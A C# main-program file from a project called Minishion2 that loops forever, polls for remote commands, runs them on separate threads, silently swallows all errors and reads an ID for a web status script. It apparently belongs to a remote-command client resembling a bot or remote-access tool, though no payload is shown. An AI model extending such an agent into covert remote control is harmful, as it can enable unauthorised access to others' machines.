using System;
using System.IO;
using System.Threading;

namespace Minishion2
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //Цикличность
            while (true) {
                try {
                    if (string.IsNullOrEmpty(Config.Id))
                    {
                        GetId();
                    }
                    if (CMD.GetComand())
                    {
                        Console.WriteLine(DateTime.Now + "-" + CMD.FullComand);
                        // Выполняется в другом потоке чтоб не стопать основной поток
                        Thread thread = new Thread(() =>
                        {
                            Functions.Func();
                        });
                        thread.Start();
                    }
                }
                catch { }   
            }
        }
        //Получение ID для Web скрипта (ISOnline)
        public static void GetId()
        {
            string id = "";
            string yourTitle = "";
            if (File.Exists(Config.PathToId))
            {
                id = File.ReadAllText(Config.PathToId).Split('#')[0];
                yourTitle = File.ReadAllText(Config.PathToId).Split('#')[1];
            }
            Config.Id = id;
            Config.YourTitle = yourTitle;
        }

    }
}
